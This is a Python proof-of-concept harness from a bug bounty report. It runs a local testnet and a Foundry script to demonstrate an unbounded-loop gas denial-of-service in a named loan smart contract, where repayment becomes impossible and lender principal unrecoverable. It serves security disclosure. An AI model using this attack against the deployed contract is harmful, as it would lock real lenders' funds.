#!/usr/bin/env python3
"""
PoC: Loan.checkExpiredLoans() unbounded loop -> DoS on repay/fundLoan/partialRepay
Finding: F3 — HIGH
Target:  gluwa/CCNext-smart-contracts / contracts/Loan/Loan.sol
Program: SpaceCoin CertIK SkyShield

Demonstrates:
  - checkExpiredLoans() gas cost grows O(N) with funded loan count
  - fundLoan / repay / partialRepay all call checkExpiredLoans() first
  - At ~7000 funded loans the 30M block gas limit is exceeded permanently
  - Lender tokens already sent to borrower; repay() DoS -> principal unrecoverable

Usage:
    cd ~/CCNext-smart-contracts
    python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_loan_unbounded_loop_dos.py
"""

import subprocess
import sys
import time
import os
import signal

REPO_DIR    = os.path.expanduser("~/CCNext-smart-contracts")
SCRIPT_PATH = "script/PocLoanUnboundedLoop.s.sol"
ANVIL_PORT  = 8547
ANVIL_HOST  = f"http://127.0.0.1:{ANVIL_PORT}"
LENDER_KEY  = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

SEP = "=" * 70


def start_anvil():
    print("[*] Starting local Anvil testnet ...")
    proc = subprocess.Popen(
        ["anvil", "--port", str(ANVIL_PORT), "--silent"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1.5)
    if proc.poll() is not None:
        print("[!] Anvil failed to start — is it installed? (brew install foundry)")
        sys.exit(1)
    print(f"[*] Anvil running on {ANVIL_HOST} (PID {proc.pid})")
    return proc


def run_forge_script():
    print(f"[*] Running forge script: {SCRIPT_PATH}")
    print()
    result = subprocess.run(
        [
            "forge", "script", SCRIPT_PATH,
            "--tc", "PocLoanUnboundedLoop",
            "--rpc-url", ANVIL_HOST,
            "--private-key", LENDER_KEY,
        ],
        capture_output=True,
        text=True,
        cwd=REPO_DIR,
    )
    return result


def parse_and_display(result):
    combined = result.stdout + result.stderr

    log_lines = []
    for line in combined.splitlines():
        stripped = line.strip()
        if any(stripped.startswith(p) for p in
               ("[deploy]", "[fund]", "[check]", "===", "checkExpiredLoans",
                "Gas per", "Funded loans", "Root cause", "After DoS", "Fix:")):
            log_lines.append(stripped)

    if not log_lines:
        print("[!] Could not parse forge output — printing raw stdout:")
        print(result.stdout[-4000:] if len(result.stdout) > 4000 else result.stdout)
        if result.returncode != 0:
            print("[!] STDERR:")
            print(result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr)
        return result.returncode == 0

    print(SEP)
    print("  SpaceCoin — F3: Loan.checkExpiredLoans() Unbounded Loop DoS PoC")
    print(SEP)
    print()
    for line in log_lines:
        print(" ", line)
    print()

    if "ATTACK CONFIRMED" in combined:
        print(SEP)
        print("  RESULT: VULNERABILITY CONFIRMED")
        print("  Gas grows O(N) with funded loans.")
        print("  repay() / fundLoan() / partialRepay() become permanently DoS'd.")
        print("  Lender principal unrecoverable once block gas limit exceeded.")
        print(SEP)
        return True
    else:
        print("[!] Expected '=== ATTACK CONFIRMED ===' not found.")
        if result.returncode != 0:
            print("[!] Exit code:", result.returncode)
            print(result.stderr[-1000:])
        return False


def main():
    print()
    print(SEP)
    print("  SpaceCoin F3 — Loan.checkExpiredLoans() Unbounded Loop DoS PoC")
    print("  CWE-400: Uncontrolled Resource Consumption (Gas DoS)")
    print(SEP)
    print()

    anvil = start_anvil()
    try:
        result = run_forge_script()
        ok = parse_and_display(result)
        sys.exit(0 if ok else 1)
    finally:
        print()
        print("[*] Shutting down Anvil ...")
        anvil.send_signal(signal.SIGTERM)
        anvil.wait()
        print("[*] Done.")


if __name__ == "__main__":
    main()
